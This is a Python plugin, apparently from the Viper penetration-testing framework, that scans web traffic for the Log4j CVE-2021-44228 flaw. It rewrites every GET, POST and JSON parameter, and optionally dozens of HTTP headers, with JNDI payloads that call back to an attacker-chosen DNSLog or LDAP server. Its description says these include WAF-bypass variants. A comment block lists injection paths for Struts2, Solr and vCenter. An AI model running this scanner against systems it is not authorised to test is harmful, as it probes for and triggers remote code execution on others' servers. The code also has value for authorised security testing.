# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

import json

from Lib.ModuleAPI import *
from Lib.api import is_json, get_one_uuid_str
from Lib.payloads import Log4jPayload
from PostModule.Handle.proxyhttpscan import ProxyResponse, ProxyRequest

"""
# Apache Struts2
/struts/utils.js
# Apache Solr
/solr/admin/cores?action=CREATE&wt=json&name=${jndi:uri}
# VMWare VCenter
/websso/SAML2/SSO/vsphere.local?SAMLRequest=
"""


class JsonReplace(object):
    def __init__(self):
        pass

    def replace_inter(self, dic, changeData):
        if isinstance(dic, dict):
            return self.replace_dict(dic, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
        elif isinstance(dic, list):
            return self.replace_dict(dic, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
        elif isinstance(dic, str):
            return changeData
        elif isinstance(dic, bytes):
            return changeData.encode()
        else:
            return dic

    # 替换请求参数
    def replace_dict(self, dic, changeData):
        """
        dic：目标字典
        changeData：替换值
        """
        for key in dic:  # 传入数据不符合则对其value值进行遍历
            value = dic[key]
            if isinstance(value, dict):
                dic[key] = self.replace_dict(value, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
            elif isinstance(value, list):
                dic[key] = self.replace_list(value, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
            elif isinstance(value, str):
                dic[key] = changeData
            elif isinstance(value, bytes):
                dic[key] = changeData.encode()

        return dic

    # 替换参数子方法
    # 数据类型判断,遍历后分别调用不用的方法
    def replace_list(self, val, changeData):
        for index in range(len(val)):
            val_ = val[index]
            if isinstance(val_, dict):
                val[index] = self.replace_dict(val_, changeData)  # 传入数据的value值是字典，则调用replace_target_Value
            elif isinstance(val_, list):
                val[index] = self.replace_list(val_, changeData)  # 传入数据的value值是列表或者元组，则调用自身
            elif isinstance(val_, str):
                val[index] = changeData
            elif isinstance(val_, bytes):
                val[index] = changeData.encode()
        return val


class PostModule(ProxyHttpScanModule):
    NAME_ZH = "Log4j2 CVE-2021-44228 扫描"
    DESC_ZH = "插件会将http请求中GET参数/POST参数/JSON参数中字符串替换为payload\n" \
              "如果选择了`扫描headers`,插件会将headers中的参数值替换为payload\n" \
              "如果DNSLOG填写为IP:PORT,Payload中则会使用LDAP协议连接对应IP:PORT,然后传递UUID用于识别请求\n" \
              "payload包含绕过WAF的payload\n"

    NAME_EN = "Log4j CVE-2021-44228 Scan"
    DESC_EN = "The plug-in will replace the string in the get parameter / post parameter / JSON parameter in the HTTP request with payload\n" \
              "If scan headers is selected, the plug-in will replace the parameter value in headers with payload\n" \
              "If the dnslog is filled in as IP: port, the corresponding IP: port will be connected in the payload using LDAP protocol, and then the UUID will be passed to identify the request\n" \
              "Payload contains a payload that bypasses the WAF\n"
    MODULETYPE = TAG2TYPE.Proxy_Http_Scan
    README = ["https://www.yuque.com/vipersec/blog/lgrqm4", "https://www.yuque.com/vipersec/blog/sn2x39"]
    REFERENCES = [""]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionStr(name='DNSLOG',
                  tag_zh="DNSLOG/LDAPServer", desc_zh="DNSLog主域名,例如:9fppts.ceye.io,或LDAP服务器,例如:192.168.146.130:1339",
                  tag_en="DNSLOG/LDAPServer",
                  desc_en="DNSLog Domain,e.g.:9fppts.ceye.io,or LDAP server,e.g.:192.168.146.130:1339"),
        OptionBool(name='ScanHeader',
                   tag_zh="扫描Headers", desc_zh="是否在Headers中添加payload",
                   tag_en="Scan Headers", desc_en="Add payload to http headers"),
        OptionBool(name='LogRequest',
                   tag_zh="打印请求日志", desc_zh="打印Http请求到日志中",
                   tag_en="Log Request", desc_en="Log http requests to logfile"),
        OptionInt(name='TIMEOUT',
                  tag_zh="请求超时时间", desc_zh="每个Request请求超时时间(秒)",
                  tag_en="Request Timeout", desc_en="Every http request timeout (seconds)",
                  default=1),
    ])

    def __init__(self, custom_param):
        super().__init__(custom_param)
        self.headers = ['Referer', 'X-Api-Version', 'Accept-Charset', 'Accept-Datetime', 'Accept-Encoding',
                        'Accept-Language',
                        # 'Cookie',
                        'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
                        'Forwarded-Proto', 'From', 'TE', 'True-Client-IP', 'Upgrade', 'User-Agent', 'Via', 'Warning',
                        'X-Api-Version', 'Max-Forwards', 'Origin', 'Pragma', 'DNT', 'Cache-Control', 'X-Att-Deviceid',
                        'X-ATT-DeviceId', 'X-Correlation-ID', 'X-Csrf-Token', 'X-CSRFToken', 'X-Do-Not-Track', 'X-Foo',
                        'X-Foo-Bar', 'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For', 'X-Forwarded-For-Original',
                        'X-Forwarded-Host', 'X-Forwarded-Port', 'X-Forwarded-Proto', 'X-Forwarded-Protocol',
                        'X-Forwarded-Scheme', 'X-Forwarded-Server', 'X-Forwarded-Ssl', 'X-Forwarder-For',
                        'X-Forward-For', 'X-Forward-Proto', 'X-Frame-Options', 'X-From', 'X-Geoip-Country',
                        'X-Http-Destinationurl', 'X-Http-Host-Override', 'X-Http-Method', 'X-Http-Method-Override',
                        'X-HTTP-Method-Override', 'X-Http-Path-Override', 'X-Https', 'X-Htx-Agent', 'X-Hub-Signature',
                        'X-If-Unmodified-Since', 'X-Imbo-Test-Config', 'X-Insight', 'X-Ip', 'X-Ip-Trail',
                        'X-ProxyUser-Ip', 'X-Requested-With', 'X-Request-ID', 'X-UIDH', 'X-Wap-Profile', 'X-XSRF-TOKEN']
        self.headers_index = 0

    def payload_list(self, req_uuid):
        if self.param("DNSLOG") is None:
            return []
        payloads = Log4jPayload().get_payload_list(req_uuid, self.param("DNSLOG"))
        return payloads

    def get_header(self):
        index = self.headers_index % len(self.headers)
        self.headers_index += 1
        return self.headers[index]

    def check(self):
        """执行前的检查函数"""
        return True, ""

    def callback(self, request: ProxyRequest, response: ProxyResponse, data=None):
        # data,额外需要传输的数据
        # 调用父类函数存储结果(必须调用)

        request.log = self.param("LogRequest")
        request.timeout = self.param("TIMEOUT")

        req_uuid = get_one_uuid_str()
        payloads = self.payload_list(req_uuid)
        uuid_data = {
            "UUID": req_uuid,
            "TAG": "PROXY_HTTP_LOG4J2",
            "LEVEL": "INFO",
            "DATA": {},
        }
        if request.method == "GET":
            if request.query:
                uuid_data["DATA"] = {
                    "method": "GET",
                    "url": request.pretty_url,
                }
                UUIDJson.store_uuid_json(uuid_data)

                for payload in payloads:
                    for key in request.query:
                        request.query[key] = payload
                    result = request.send()
        elif request.method == "POST":
            if request.urlencoded_form:

                uuid_data["DATA"] = {
                    "method": "POST",
                    "url": request.pretty_url,
                }
                UUIDJson.store_uuid_json(uuid_data)

                for payload in payloads:
                    for key in request.urlencoded_form:
                        request.urlencoded_form[key] = payload
                    result = request.send()
            else:
                if is_json(request.text):
                    uuid_data["DATA"] = {
                        "method": "POST",
                        "url": request.pretty_url,
                        "json": request.text,
                    }
                    UUIDJson.store_uuid_json(uuid_data)
                    for payload in payloads:
                        try:
                            old_dict = json.loads(request.text)
                        except Exception as e:
                            print(e)
                            continue
                        new_dict = JsonReplace().replace_inter(old_dict, payload)
                        request.text = json.dumps(new_dict)
                        result = request.send()

        if self.param("ScanHeader"):
            req_uuid = get_one_uuid_str()
            payloads = self.payload_list(req_uuid)
            uuid_data = {
                "UUID": req_uuid,
                "TAG": "PROXY_HTTP_LOG4J2",
                "LEVEL": "INFO",
                "DATA": {
                    "method": "HEADER",
                    "url": request.pretty_url,
                }
            }
            UUIDJson.store_uuid_json(uuid_data)
            for payload in payloads:
                for key in request.headers:
                    request.headers[key] = payload
                result = request.send()
        return True
